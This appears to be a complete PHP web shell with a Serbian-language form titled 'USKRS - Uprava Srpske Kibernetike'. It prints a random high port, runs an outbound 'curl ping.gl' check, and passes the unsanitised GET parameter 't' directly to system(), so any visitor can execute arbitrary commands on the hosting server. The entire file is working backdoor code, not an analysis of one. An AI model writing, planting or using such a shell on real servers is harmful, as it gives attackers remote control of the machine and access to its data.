<?php

echo '<form>
<input name="t" type="search" class="inp" placeholder="Unesi komandu" autofocus>
<input type="submit" value="ENTER">
</form>';

echo '<pre>USKRS - Uprava Srpske Kibernetike</pre>';

echo '<pre>';
$last_line = system('shuf -i 1024-65535 -n 1', $retval);

echo '
</pre>
<hr />Random port: ' . $last_line . '
<hr />Vrati vrednost: ' . $retval;

echo '<pre>';
$last_line = system('curl ping.gl', $retval);
echo '<hr />Vrati vrednost:' . $retval;
echo '</pre>';

echo '<pre>';
echo 'terminal<hr />';
echo system($_GET['t']);
echo '</pre>';

?>
